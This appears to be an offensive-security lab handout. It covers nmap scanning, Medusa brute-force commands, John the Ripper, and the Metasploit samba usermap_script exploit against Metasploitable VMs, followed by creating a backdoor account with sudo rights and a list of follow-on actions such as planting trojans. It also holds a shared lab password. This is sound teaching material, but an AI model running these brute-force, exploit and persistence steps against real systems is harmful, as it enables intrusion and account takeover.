## Security Fundamentals



### Why Kali?

Kali linux is a customized linux distribution with a set of comprehensive security tools.

### Offensive Security Concepts

Network Scans - NMAP

Run a NMAP scan of your home network

What were the results of that scan?

How would you use this information to exploit the systems in your home?

How can this be applied to real world situations?

Brute Force Tools - Medusa

Use Medusa to brute force the Metasploitable VM

Download these files to prepare for the Medusa exercise

## 500 Worst Passwords Download 👇🏾
[![500 Worst Passwords](bad-password.png)](https://tekperfect-devops-uploads.s3-us-west-1.amazonaws.com/500-worst-passwords.txt)

## 10000 Worst Passwords Download 👇🏾
[![10000 Worst Passwords](bad-password.png)](https://tekperfect-devops-uploads.s3-us-west-1.amazonaws.com/10000-worst-passwords.txt)

## 100K Worst Passwords Download 👇🏾
[![100k Worst Passwords](bad-password.png)](https://tekperfect-devops-uploads.s3-us-west-1.amazonaws.com/100k-most-used-passwords.txt)


### Medusa Brute Force Attack

medusa -C dump_targets.txt -M http

medusa -H targets.txt xxx.xxx.xxx.xxx -U usernames.txt -p password_list.txt -M ftp

medusa -h xxx.xxx.xxx.xxx -U usernames.txt -P password_list.txt -M ssh

medusa -h xxx.xxx.xxx.xxx -u username -P password_list.txt -M http

medusa -h xxx.xxx.xxx.xxx -U usernames.txt -p password_list.txt -M ssh

medusa -H targets.txt xxx.xxx.xxx.xxx -U usernames.txt -p password_list.txt -M ftp

Medusa is capable of using the following authenication methods -  AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, PostgreSQL, REXEC, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper, Web Form

### Online and Offline Password Cracking - John the Ripper

## Password Hash Download 👇🏾
[![John the Ripper](john-the-ripper.png)](https://tekperfect-devops-uploads.s3-us-west-1.amazonaws.com/password-hash.txt)

john password-hash.txt

### Environment Prep

Download a copy of Kali and import the image into virtualbox

## Kali VM Download 👇🏾
[![Kali](kali.png)](https://tekperfect-devops-uploads.s3-us-west-1.amazonaws.com/kali-sandbox.ova)

Download a copy of Metasploitable and import the image into virtualbox
## Metasploitable VM Download 👇🏾
[![Metasploitable](metasploitable.png)](https://tekperfect-devops-uploads.s3-us-west-1.amazonaws.com/Metasploitable.ova)

Download a copy of Metasploitable3 and import the image into virtualbox
## Metasploitable3 VM Download 👇🏾
[![Metasploitable3](metasploitable.png)](https://tekperfect-devops-uploads.s3-us-west-1.amazonaws.com/metasploitable3_win2k8.ova)


### Environment Prep

Step 1: Launch your Kali VM and make sure the network settings are set to bridged mode

Step 2: Launch your Metasploit VM and make sure the network settings are set to bridged mode

Step 3: If you downloaded my Kali prebuilt image use username of "devops" and the password “D3v0psCr3w!” otherwise use the username and password you created.


### Environment Prep (cont)

Step 4: Verify that your system has a similar IP to your Kali Linux VM.

Step 5: For example if your IP address was 192.168.1.2 your Kali VM’s IP should be 192.168.1.xxx where the xxx is a number between 1 and 254. 

Once you have established that your environment is setup properly you are ready to begin

### Reconnaissance

Run a NMAP scan to what’s vulnerable

Host only scan: `nmap xxx.xxx.xxx.xxx -sn` (shows what hosts are alive)

Quick NMAP scan: `nmap –F xxx.xxx.xxx.xxx` (scans 100 ports per host)

Host identification scan: `nmap –sV -O xxx.xxx.xxx.xxx` (what’s important here)

Longer more thorough scan – `nmap –p- xxx.xxx.xxx.xxx` (scans all ports)


### Reconnaissance Cont

When running a nmap scan you can use the following to pipe the output into a file so that you can reference the hosts that you found that might be available to exploit

`nmap xxx.xxx.xxx.xxx -sn > ~/ipscan.txt`

You can also run a scan pre and post starting your metasploitable VM and run the scan results through vimdiff to narrow down the results.

Cmd Example: vmdiff before.txt after.txt


### Evaluate

How many hosts did you find?

What ports are available to exploit?

What kind of exploit or brute for attack can you run against those ports?

Run an exploit on the system to obtain reverse shell or brute force known accounts

### Exploit

When executing an exploit please remember that you may need to specify the following options

This is the command you use to set the host you are going to run the exploit against once you locate it on your network

`set RHOSTS xxx.xx.xxx.xxx`

This is the command you use to set the port of the host you are trying to exploit

`set RPORT xxxx`

Sets the target IP globally so that you don't have to set the target IP each time you switch exploits

`setg RHOSTS`

Starts the exploit against the system you specified with the set rhost command

`run`

Other options: `set username`, `set password`

Exploit

This is the root folder that is searched when an exploit is run

`set targeturi`

This is the number of threads you want to launch against a host you want to attack

`set threads`

This is the port you will deliver the exploit from meaning a port on your system

`set srvport`

Use this tool to search for the specific types of exploits you want to launch against a target

`grep exploit search service_type`


### Exploit

This is the samba exploit you can launch against the metasploitable linux server

`use exploit/multi/samba/usermap_script`

This is the command you use to set the host you are going to run the exploit against once you locate it on your network

`set rhosts xxx.xx.xxx.xxx`

Starts the exploit against the system you specified with the set rhost command.

`run`

Is the access you have when you have successful executed the exploit against the vulnerable system.

`reverse shell`

### Create, Elevate & Gain access

Create an account on the system via reverse shell

`useradd username`

Change the password on the account you just created

`passwd username`

Process of granting privileges to a known or created account to gain root level access to system

### Elevate Privileges

Add the account to the sudo group

`usermod -a -G sudo username`

Add the account to the admin group

`usermod -a -G admin username`

Connect & Elevate Access

Connect to a remote or local system via ssh with a named account that you know the password to

`ssh username@xxx.xxx.xxx.xxx`

Run a command with root or elevated privileges example: “sudo passwd username” changes the password of an account

`sudo command-name`

### Now What?

Add additional accounts

Search the system for sensitive data

Delete files

Change data on system or services running on the system

Plant a virus or trojan

Attack other systems from this system

### Why is this exercise important?

It’s vital to understanding the command line

It’s critical to understanding security and vulnerabilities

If you don’t practice using these tools you will not understand the material 

### Hacking Exercise

Use Kali to find exploits in Metasploitable and Metasploitable3

Break up into two team and name your team

Team with the most points wins

***Total possible points 400***

120 Possible points for exploit

120 possible points for demo or recording exploints

120 possible points for documenting how each exploit works

40 points for the best presentation

Team with the most points wins

